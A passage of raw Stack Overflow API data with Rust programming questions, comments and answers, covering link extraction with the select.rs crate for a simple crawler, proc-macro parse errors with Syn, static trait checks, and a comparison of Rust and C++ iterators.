"is_answered": true, "view_count": 227, "favorite_count": 0, "accepted_answer_id": 49014999, "answer_count": 1, "score": 0, "last_activity_date": 1519754064, "creation_date": 1519738864, "last_edit_date": 1519750314, "question_id": 49010091, "link": "https://stackoverflow.com/questions/49010091/how-do-i-extract-the-href-attributes-from-a-html-document-with-select-rs", "title": "How do I extract the &quot;href&quot; attributes from a HTML document with select.rs?", "body": "<p>I am trying to write a very basic crawler. After receiving an HTTP response, I am using the <a href=\"https://github.com/utkarshkukreti/select.rs\" rel=\"nofollow noreferrer\">select.rs</a> crate to extract the URLs from the body for further crawling.</p>\n\n<p>How can I extract these URLs from from the \"document\" which is the \"body\" part of the HTTP response using the \"for-iteration\"? </p>\n\n<pre><code>extern crate hyper;\nextern crate select;\nextern crate xhtmlchardet;\nextern crate robotparser;\nextern crate url;\n\nuse std::io::Read;\nuse Crawler::hyper::client::Client;\nuse Crawler::hyper::header::Connection;\nuse Crawler::select::document::Document;\nuse Crawler::select::predicate::*;\n\npub fn crawl(url: &amp;str) {\n\n    //Opens up a new HTTP client\n    let client = Client::new();\n\n    //Creates outgoing request\n    let mut res = client.get(&amp;*url)\n        .header(Connection::close())\n        .send().unwrap();\n\n    //Reads the response\n    let mut body = String::new();\n    res.read_to_string(&amp;mut body).unwrap();\n\n    println!(\"Response: {}\", res.status);\n    println!(\"Headers:\\n{}\", res.headers);\n    println!(\"Body:\\n{}\", body);\n\n\n    let document = Document::from_str(&amp;*body);\n\n    for node in document.find(Attr(\"id\", \"hmenus\")).find(Name(\"a\")).iter() {\n        println!(\"{} ({:?})\", node.text(), node.attr(\"href\").unwrap());\n    }\n}\n</code></pre>\n\n<p>The result of executing crawl for a URL like \"um.ac.ir\" is a full HTTP response with a body. I am trying to extract the <code>href</code>s from this output.  </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Response: 200 OK\nHeaders:\nX-Content-Type-Options: nosniff\nX-Frame-Options: sameorigin\nCache-Control: cache\nDate: Tue, 27 Feb 2018 13:16:27 GMT\nVary: Accept-Encoding\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nTransfer-Encoding: chunked\nPragma: no-cache\nServer: GFW/2.0\nConnection: close\nContent-Type: text/html; charset=utf-8\nStrict-Transport-Security: max-age=63072000; preload\nSet-Cookie: POSTNUKESID=pnd2nuadgastqak5h6nop87c63; path=/\n\n...\n\n&lt;div class=\"col-md-4\"&gt;\n    &lt;h3&gt;\u0633\u0627\u06cc\u0631&lt;/h3&gt;\n    &lt;ul&gt; \n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://ftpnews.um.ac.ir/\"&gt;\u0633\u0627\u06cc\u062a \u062e\u0628\u0631\u06cc ftp \u062f\u0627\u0646\u0634\u06af\u0627\u0647&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://news.um.ac.ir/Topic96.html\"&gt;\u06af\u0632\u06cc\u0646\u0634 \u062f\u0627\u0646\u0634\u06af\u0627\u0647 &lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://herasat.um.ac.ir/index.php?lang=fa\"&gt;\u0645\u062f\u06cc\u0631\u06cc\u062a \u062d\u0631\u0627\u0633\u062a \u062f\u0627\u0646\u0634\u06af\u0627\u0647 &lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://mafakher.um.ac.ir/\"&gt;\u0645\u0631\u0643\u0632 \u0622\u062b\u0627\u0631\u0645\u0641\u0627\u062e\u0631 \u0648 \u0627\u0633\u0646\u0627\u062f \u062f\u0627\u0646\u0634\u06af\u0627\u0647&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://intr.um.ac.ir/\"&gt;\u0645\u062f\u06cc\u0631\u06cc\u062a \u0647\u0645\u0643\u0627\u0631\u06cc \u0647\u0627\u06cc \u0639\u0644\u0645\u06cc \u0648 \u0628\u06cc\u0646 \u0627\u0644\u0645\u0644\u0644\u06cc&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://eva.um.ac.ir/\"&gt; \u0645\u062f\u06cc\u0631\u06cc\u062a \u0646\u0638\u0627\u0631\u062a \u0648 \u0627\u0631\u0632\u06cc\u0627\u0628\u06cc \u062f\u0627\u0646\u0634\u06af\u0627\u0647&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://saybanemehr.um.ac.ir/\"&gt;\u0633\u0627\u06cc\u062a \u0633\u0627\u06cc\u0628\u0627\u0646 \u0645\u0647\u0631&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://faf.um.ac.ir/\"&gt;\u0628\u0646\u06cc\u0627\u062f \u062f\u0627\u0646\u0634\u06af\u0627\u0647\u06cc \u0641\u0631\u062f\u0648\u0633\u06cc&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://ads.um.ac.ir/\"&gt;\u0622\u06af\u0647\u064a \u0647\u0627 \u0648 \u062a\u0628\u0644\u064a\u063a\u0627\u062a \u062f\u0627\u0646\u0634\u06af\u0627\u0647&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://fumblog.um.ac.ir/\"&gt;\u0633\u0627\u0645\u0627\u0646\u0647 \u0645\u062f\u06cc\u0631\u06cc\u062a \u0648\u0628\u0644\u0627\u06af&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://basijasatid.um.ac.ir/\"&gt;\u0628\u0633\u06cc\u062c \u0627\u0633\u0627\u062a\u06cc\u062f&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://basij.um.ac.ir/\"&gt;\u0628\u0633\u06cc\u062c \u0643\u0627\u0631\u0643\u0646\u0627\u0646&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a target=\"_blank\" href=\"http://nahad.um.ac.ir/\"&gt;\u0646\u0647\u0627\u062f \u0646\u0645\u0627\u06cc\u0646\u062f\u06af\u06cc \u0631\u0647\u0628\u0631\u06cc \u062f\u0631 \u062f\u0627\u0646\u0634\u06af\u0627\u0647&lt;/a&gt;&lt;/li&gt;\n    &lt;/ul&gt; \n&lt;/div&gt;\n\n...   \n</code></pre>\n\n<p>The problem is that the <code>println!(\"{} ({:?})\", node.text(), node.attr(\"href\").unwrap())</code> doesn't output anything since the <code>[...].iter()</code> is not working correctly:</p>\n\n<pre><code>for node in document.find(Attr(\"id\", \"hmenus\")).find(Name(\"a\")).iter() {\n        println!(\"{} ({:?})\", node.text(), node.attr(\"href\").unwrap());\n    }\n</code></pre>\n\n<p>It seems that <code>find(Attr(\"id\", \"hmenus\")).find(Name(\"a\"))</code> isn't the right way for finding \"href\" tags from the body of the HTTP response. </p>\n\n<p>I believe rewriting this part should fix the problem in my code, although it requires an overall knowledge of how <code>select::document</code> is working.</p>\n"}, {"tags": ["rust", "rust-macros"], "comments": [{"owner": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "edited": false, "score": 0, "creation_date": 1519733237, "post_id": 49005146, "comment_id": 85021025, "body": "I&#39;m not quiet sure, what your main concern is, does <a href=\"https://doc.rust-lang.org/unstable-book/language-features/trace-macros.html\" rel=\"nofollow noreferrer\">trace_macros!</a> and <a href=\"https://doc.rust-lang.org/unstable-book/language-features/log-syntax.html\" rel=\"nofollow noreferrer\">log_syntax!</a> may help you?"}, {"owner": {"reputation": 499, "user_id": 8550523, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6UROd.jpg?s=128&g=1", "display_name": "pepsighan", "link": "https://stackoverflow.com/users/8550523/pepsighan"}, "reply_to_user": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "edited": false, "score": 0, "creation_date": 1519735842, "post_id": 49005146, "comment_id": 85022542, "body": "My main concern is that the users of this macro will have to look for themselves for any error in the custom syntax. I would like the parser to display where the error occurred."}], "answers": [{"tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 3, "last_activity_date": 1538963982, "creation_date": 1538963982, "answer_id": 52694487, "question_id": 49005146, "link": "https://stackoverflow.com/questions/49005146/how-do-i-provide-helpful-compiler-errors-in-a-procedural-macro/52694487#52694487", "title": "How do I provide helpful compiler errors in a procedural macro?", "body": "<p>By upgrading your macro to use <a href=\"https://github.com/dtolnay/syn/releases/tag/0.15.0\" rel=\"nofollow noreferrer\">Syn 0.15</a> or greater, you get helpful parse error messages with no additional effort.</p>\n\n<pre><code>extern crate proc_macro;\nuse self::proc_macro::TokenStream;\n\nuse syn::parse::{Parse, ParseStream, Result};\nuse syn::{parse_macro_input, Ident, Token};\n\n// FIXME\ntype Element = Ident;\n\nstruct ElementList {\n    inner: Vec&lt;Element&gt;,\n}\n\nimpl Parse for ElementList {\n    fn parse(input: ParseStream) -&gt; Result&lt;Self&gt; {\n        let mut list = Vec::new();\n        while let Some(element) = input.parse()? {\n            list.push(element);\n        }\n        Ok(ElementList { inner: list })\n    }\n}\n\nstruct BlockElement {\n    stag: Ident,\n    child: Vec&lt;Element&gt;,\n    ctag: Ident\n}\n\nimpl Parse for BlockElement {\n    fn parse(input: ParseStream) -&gt; Result&lt;Self&gt; {\n        input.parse::&lt;Token![&lt;]&gt;()?;\n        let stag: Ident = input.parse()?;\n        input.parse::&lt;Token![&gt;]&gt;()?;\n        let child: ElementList = input.parse()?;\n        input.parse::&lt;Token![&lt;]&gt;()?;\n        input.parse::&lt;Token![/]&gt;()?;\n        let ctag: Ident = input.parse()?;\n        input.parse::&lt;Token![&gt;]&gt;()?;\n        Ok(BlockElement { stag, child: child.inner, ctag })\n    }\n}\n\n#[proc_macro]\npub fn html_syntax(input: TokenStream) -&gt; TokenStream {\n    let _input = parse_macro_input!(input as BlockElement);\n\n    // TODO\n    TokenStream::new()\n}\n</code></pre>\n\n<p>Here is an example of an input parse error. Such errors will indicate where the input failed to parse and what token(s) the macro would have expected in that position.</p>\n\n<pre><code>fn main() {\n    html_syntax!(&lt;em&gt;syn quote proc_macro2&lt;em&gt;);\n}\n</code></pre>\n\n\n\n<pre><code>error: expected `/`\n --&gt; src/main.rs\n  |\n  |     html_syntax!(&lt;em&gt;syn quote proc_macro2&lt;em&gt;);\n  |                                            ^^\n</code></pre>\n"}], "owner": {"reputation": 499, "user_id": 8550523, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6UROd.jpg?s=128&g=1", "display_name": "pepsighan", "link": "https://stackoverflow.com/users/8550523/pepsighan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 330, "favorite_count": 0, "accepted_answer_id": 52694487, "answer_count": 1, "score": 8, "last_activity_date": 1538963982, "creation_date": 1519723392, "last_edit_date": 1519736282, "question_id": 49005146, "link": "https://stackoverflow.com/questions/49005146/how-do-i-provide-helpful-compiler-errors-in-a-procedural-macro", "title": "How do I provide helpful compiler errors in a procedural macro?", "body": "<p>I am designing a custom HTML syntax parser using <code>proc_macro</code> and <code>syn</code>. A sample:</p>\n\n<pre><code>#[derive(Debug)]\nstruct BlockElement {\n    stag: Ident,\n    child: Vec&lt;Element&gt;,\n    ctag: Ident\n}\n\nimpl Synom for BlockElement {\n     named!(parse -&gt; Self, do_parse!(\n         punct!(&lt;) &gt;&gt;\n         stag: syn!(Ident) &gt;&gt;\n         punct!(&gt;) &gt;&gt;\n         child: syn!(ElementList) &gt;&gt;\n         punct!(&lt;) &gt;&gt;\n         punct!(/) &gt;&gt;\n         ctag: syn!(Ident) &gt;&gt;\n         punct!(&gt;) &gt;&gt;\n         (BlockElement { stag, child: child.inner, ctag })\n     ));\n }\n</code></pre>\n\n<p>Though I know how give out errors using <code>Span</code> after it has been parsed, I am not able to figure how to do it during a parse. It just errors out with <code>failed to parse anything</code>. How to pin-point where parsing failed and give appropriate error?</p>\n"}, {"tags": ["rust"], "owner": {"reputation": 73, "user_id": 9416273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3567fbdfbadb27c1e624bf7b4bebec3f?s=128&d=identicon&r=PG&f=1", "display_name": "aeafwefcve", "link": "https://stackoverflow.com/users/9416273/aeafwefcve"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 42, "favorite_count": 0, "closed_date": 1519697150, "answer_count": 0, "score": 1, "last_activity_date": 1519697013, "creation_date": 1519696724, "last_edit_date": 1519697013, "question_id": 48999950, "link": "https://stackoverflow.com/questions/48999950/is-there-a-way-to-statically-verify-that-a-type-implements-certain-traits", "closed_reason": "Duplicate", "title": "Is there a way to statically verify that a type implements certain traits?", "body": "<p>I'm writing a library in Rust and I am exposing a type which needs to implement <code>Send</code> and <code>Sync</code>. In my library, I don't take advantage of the fact that it implements these traits, but my users will. Is there some way to tell the compiler that I need the type to implement these traits, and have it raise a compile error if it doesn't?</p>\n"}, {"tags": ["c++", "iterator", "rust"], "comments": [{"owner": {"reputation": 31368, "user_id": 3133316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30f0b31e22bec21f12f31cd30ae5b148?s=128&d=identicon&r=PG&f=1", "display_name": "PaulMcKenzie", "link": "https://stackoverflow.com/users/3133316/paulmckenzie"}, "edited": false, "score": 6, "creation_date": 1519695409, "post_id": 48999776, "comment_id": 85004803, "body": "Two different languages, different syntax, etc."}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 1, "creation_date": 1519695679, "post_id": 48999776, "comment_id": 85004867, "body": "Python&#39;s approach is quite similar to Rust&#39;s. You wrap up a bit more logic in the iterator, so it knows when it ends without needing to compare it to a sentinel value (the end iterator in C++). C++&#39;s approach can be a bit tedious, since utility functions end up needing separate arguments for the begin and end iterators, rather than simply receiving an iterator that knows its own end point."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519695830, "post_id": 48999776, "comment_id": 85004897, "body": "The Rust equivalent of the C++ code would be <code>let v = vec![1, 2, 3, 4]; for i in &amp;v { println!(&quot;{},&quot;, i); }</code> Note the lack of calls to <code>next</code>. You may wish to further your learning of Rust; these types of questions wash away with increased baseline knowledge."}, {"owner": {"reputation": 302, "user_id": 4683272, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-TQCCt9FEUY4/AAAAAAAAAAI/AAAAAAAAAXQ/H0hK_uZQnEo/photo.jpg?sz=128", "display_name": "The_Babu", "link": "https://stackoverflow.com/users/4683272/the-babu"}, "reply_to_user": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 1, "creation_date": 1519696354, "post_id": 48999776, "comment_id": 85005021, "body": "So are there any of these types of Iterators in C++, because I agree with @ShadowRanger, it is quite tedious, and I think Rust&#39;s approach is better... but I think that is not the case sense a lot of functions need to separately have the begin and ending iterators... Also I&#39;ve researched a bit and seen that these may be called Internal and External Iterators... but is that entirely true?"}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 2, "creation_date": 1519696656, "post_id": 48999776, "comment_id": 85005109, "body": "C++11 added range-for: <a href=\"http://en.cppreference.com/w/cpp/language/range-for\" rel=\"nofollow noreferrer\">en.cppreference.com/w/cpp/language/range-for</a> which at least moves in the right direction."}, {"owner": {"reputation": 449289, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1519699475, "post_id": 48999776, "comment_id": 85005757, "body": "@Hacksaurus_Babu: the Rust vector example you showed is not unlike how most C++ containers operator. They typically use classes for their iterators instead of raw pointers, and those classes implement <code>operator++</code> similar to Rust&#39;s <code>next()</code>. Your <code>std::begin()</code> example is different because it uses a fixed array, so it uses raw pointers for its iterators. Try using <code>std::array</code> instead of <code>int[]</code>, and you might see something different, depending on STL implementation"}, {"owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519703609, "post_id": 48999776, "comment_id": 85006758, "body": "Instead of <code>for(int* i = begin; i &lt; end; i++)</code> you should use the iterators directly: <code>for(auto it = std::begin(array); it != std::end(array); ++it)</code>"}, {"owner": {"reputation": 1003, "user_id": 1103760, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/OInfA.png?s=128&g=1", "display_name": "don bright", "link": "https://stackoverflow.com/users/1103760/don-bright"}, "edited": false, "score": 0, "creation_date": 1547964251, "post_id": 48999776, "comment_id": 95370455, "body": "1. and 2: In Rust, an amateur newbie like me can create a iterator for my own custom data type after an hour or two of studying, and once it compiles, it usually &quot;just works&quot;. I then can use dozens of different iterator adaptors (filter,map,fold) that are built into the language, thanks to its heritage from Functional-ish and immutable-ish languages like lisp and haskell. In C++ iterators are massive header templates that, when used strictly, keep you from writing terrible for(){} blocks and crashing all the time and accidentally modifying your index while you are in the middle of a loop."}], "answers": [{"comments": [{"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "edited": false, "score": 5, "creation_date": 1519699782, "post_id": 49000191, "comment_id": 85005834, "body": "Conceptually, C++ iterators are vastly different from iterators in Rust. Iterators in C++ are more like generalized pointers and you can write functions like <code>std::sort</code> or <code>std::find_if</code>. In Rust, you can&#39;t use iterators to represent ranges at all, so many of these techniques from C++ must be rewritten."}, {"owner": {"reputation": 1726, "user_id": 1429658, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/fecbd8a5bea71e1103c82bcc4eb16237?s=128&d=identicon&r=PG", "display_name": "Litty", "link": "https://stackoverflow.com/users/1429658/litty"}, "reply_to_user": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "edited": false, "score": 0, "creation_date": 1519701664, "post_id": 49000191, "comment_id": 85006282, "body": "Before the question&#39;s edits it seemed the basic mental concept of an iterator was missing; It felt appropriate to shed things down to a basic level. I agree this answer is too oversimplified now."}, {"owner": {"reputation": 16482, "user_id": 5632316, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/9I9Vm.jpg?s=128&g=1", "display_name": "Oliv", "link": "https://stackoverflow.com/users/5632316/oliv"}, "edited": false, "score": 0, "creation_date": 1519721806, "post_id": 49000191, "comment_id": 85013818, "body": "@Litty, Your answer is not too oversimplified, the difference is realy about the language grammar, not about the iterator concept. The implementations of this same concept in these two languages reflect the intent of these two languages: in Rust errors are avoided, in C++ optimal efficiency is accessible."}, {"owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "reply_to_user": {"reputation": 16482, "user_id": 5632316, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/9I9Vm.jpg?s=128&g=1", "display_name": "Oliv", "link": "https://stackoverflow.com/users/5632316/oliv"}, "edited": false, "score": 2, "creation_date": 1519739881, "post_id": 49000191, "comment_id": 85025245, "body": "@Oliv: Could you give an example where optimal efficiency is possible in C++ but not Rust?"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "reply_to_user": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "edited": false, "score": 1, "creation_date": 1519740317, "post_id": 49000191, "comment_id": 85025532, "body": "@DietrichEpp can you expand on what you mean by <i>in Rust, you can&#39;t use iterators to represent ranges at all</i>? For example, this <a href=\"https://play.rust-lang.org/?gist=7fc8369571a5867a7ef92f14351e712a&amp;version=stable\" rel=\"nofollow noreferrer\">is what I would consider iterating over a range of a collection</a>. You can also iterate directly on a range (<code>for i in 0..10 {}</code>)."}, {"owner": {"reputation": 16482, "user_id": 5632316, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/9I9Vm.jpg?s=128&g=1", "display_name": "Oliv", "link": "https://stackoverflow.com/users/5632316/oliv"}, "edited": false, "score": 0, "creation_date": 1519742712, "post_id": 49000191, "comment_id": 85027236, "body": "@Mathieu M. What about a structure that holds 2 iterator pointing to 2 container having the same size? What would be the size of such a struct in Rust and C++. Rust check that you do not derefence an invalid pointer each time, C++ does not, etc... There is nothing free, if rust ensures no mistake, it descreases freedom so it decreases oportunities to express your idea or to do efficient code. Your comment is almost systemic when one read word like efficiency. Reaction is not a thought, this is someone else thought. So blind acceptance or denial by reaction  are both signs of manipulation."}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519744701, "post_id": 49000191, "comment_id": 85028679, "body": "@Shepmaster: You can do that, but an iterator in Rust lacks many of the operations I would consider standard for working with ranges. You can\u2019t compare their positions, test if one range is contained in another, or extend the range. So the iterators may iterate over a range, but they can\u2019t really be used to represent the range itself. C++ supports comparisons between iterators and lets you move some iterators in both directions, which gives you everything you need to represent ranges as iterator pairs."}], "tags": [], "owner": {"reputation": 1726, "user_id": 1429658, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/fecbd8a5bea71e1103c82bcc4eb16237?s=128&d=identicon&r=PG", "display_name": "Litty", "link": "https://stackoverflow.com/users/1429658/litty"}, "is_accepted": false, "score": -2, "last_activity_date": 1519698608, "creation_date": 1519698608, "answer_id": 49000191, "question_id": 48999776, "link": "https://stackoverflow.com/questions/48999776/what-are-the-main-differences-between-a-rust-iterator-and-c-iterator/49000191#49000191", "title": "What are the main differences between a Rust Iterator and C++ Iterator?", "body": "<p>I see three things going on here. Let's break it down.</p>\n\n<h1>The Idea of an Iterator</h1>\n\n<p>When you call C++'s <code>std::begin</code> and Rust's <code>.iter()</code> in your examples, you are receiving two \"types of objects\" that are conceptually identical: An iterator.</p>\n\n<p>If we forget about the implementation details for a moment, we can see the purpose and usability of an iterator happen to be similar in both languages. We find that both iterators:</p>\n\n<ul>\n<li>Are \"objects\" which can be created from a collection (an \"Iterable type\")</li>\n<li>Can be advanced using C++'s <code>std::advance</code> and Rust's <code>.next()</code></li>\n<li>Have an \"end,\" determined by C++'s <code>std::end</code> and the output of Rust's <code>.next()</code>.</li>\n</ul>\n\n<p>This is a gross oversimplification of course, they are similar and different in many other ways, but this is probably the general overview you're looking for.</p>\n\n<h1>The Implementation of an Iterator</h1>\n\n<p>Despite sharing common themes, C++ and Rust are very different languages and will naturally implement a single idea differently. Iterators are no exception.</p>\n\n<p>The \"why\" is too broad to really answer here on Stack Overflow. It's like asking why oranges are orange and bananas are not :)</p>\n\n<p>But you do seem somewhat confused about how to work with Rust's implementation of iterators, given your comment:</p>\n\n<blockquote>\n  <p>I couldn't find any exact definition of a pointer in the Rust docs</p>\n</blockquote>\n\n<p>Don't think like a C++ programmer right now. Check out <a href=\"https://doc.rust-lang.org/book/\" rel=\"nofollow noreferrer\">The Book</a> if you haven't already and explore the concepts of borrowing and ownership; It is the far more <em>typical</em> way you will work with data, and it is required to understand how Rust's iterators work.</p>\n\n<h1>The Syntactical Sugar for Iterators</h1>\n\n<p><em>Both</em> C++ and Rust have \"magic\" in their <code>for</code> loops that let you work with iterator \"types\" easily.</p>\n\n<p>Contrary to your question, this is not a concept unique to Rust. In C++ an object can be used with the modern <code>for (item : collection)</code> syntax if it <a href=\"https://stackoverflow.com/questions/8164567/how-to-make-my-custom-type-to-work-with-range-based-for-loops\">implements special methods</a>, similar to the <code>Iterator</code> trait you pointed out.</p>\n\n<h1>Summary</h1>\n\n<blockquote>\n  <p>What are the main differences?</p>\n</blockquote>\n\n<p>Not much conceptually.</p>\n\n<blockquote>\n  <p>Why does Rust have iterators in this fashion and why are they expressed so differently?</p>\n</blockquote>\n\n<p>It be like it is because it do. They are more similar than you believe.</p>\n\n<blockquote>\n  <p>Are there Rust-type iterators in C++? Are there C++-type iterators in Rust?</p>\n</blockquote>\n\n<p>They are conceptually identical.</p>\n\n<blockquote>\n  <p>Are they called something specific? (Internal/External?)</p>\n</blockquote>\n\n<p>There might be some fancy academic terminology for the implementation differences but I'm not aware of it. An iterator is an iterator.</p>\n"}, {"comments": [{"owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519705305, "post_id": 49000845, "comment_id": 85007145, "body": "&quot;A Rust iterator is almost equivalent to a start + end C++ iterator pair.&quot; this would assume, that every iterator impl <a href=\"https://doc.rust-lang.org/std/iter/trait.ExactSizeIterator.html\" rel=\"nofollow noreferrer\">ExactSizeIterator</a>, which is not the case at all"}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "reply_to_user": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519705669, "post_id": 49000845, "comment_id": 85007237, "body": "@Tim: ExactSizeIterator in Rust more or less corresponds to ForwardIterator in C++. Just like not all iterators in Rust are ExactSizeIterator, not all iterators in C++ are ForwardIterator.\\"}, {"owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519705764, "post_id": 49000845, "comment_id": 85007271, "body": "I just wanted to clearify, that not all iterators in rust have something like <code>end</code>, since they are lazy."}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "reply_to_user": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": 